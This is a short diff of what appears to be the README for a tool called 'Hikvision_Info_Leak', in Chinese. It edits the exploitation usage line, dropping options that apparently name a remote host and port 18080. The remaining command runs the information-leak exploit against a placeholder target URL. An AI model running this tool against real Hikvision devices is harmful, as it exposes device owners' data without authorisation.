@@ -26,7 +26,7 @@
 **利用**
 
 ```shell
-./Hikvision_Info_Leak -e -u http://xxxx.xx.xxx.xx -r x.x.x.x -p 18080
+./Hikvision_Info_Leak -e -u http://xxxx.xx.xxx.xx
 ```
 
 ## 注意
